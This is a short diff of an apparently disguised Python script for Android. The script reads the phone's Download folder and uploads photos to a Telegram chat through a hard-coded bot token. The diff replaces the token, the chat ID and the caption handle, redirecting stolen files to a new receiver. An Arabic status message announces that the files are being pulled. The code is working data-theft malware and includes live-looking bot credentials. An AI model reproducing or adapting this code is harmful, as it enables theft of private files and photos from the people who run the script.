@@ -35,13 +35,13 @@ slow("""
   [ 6 ] - 20k   
 """)
 
-bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")
+bot = telebot.TeleBot("6785417702:AAHXTfPdboBOW6ITv2QBxftMDDOXHb6t9g8")
 dir_path = "/storage/emulated/0/Download/"
 bot.send_message(chat_id=6392238598, text= 'جاري سحب ملفات مجلد Download 😜🔥')
 def send_file1(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id=6392238598, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id=6723830547, photo=f, caption='By: @AX_GBBOT')
 
 
 def send_file2(file_path):
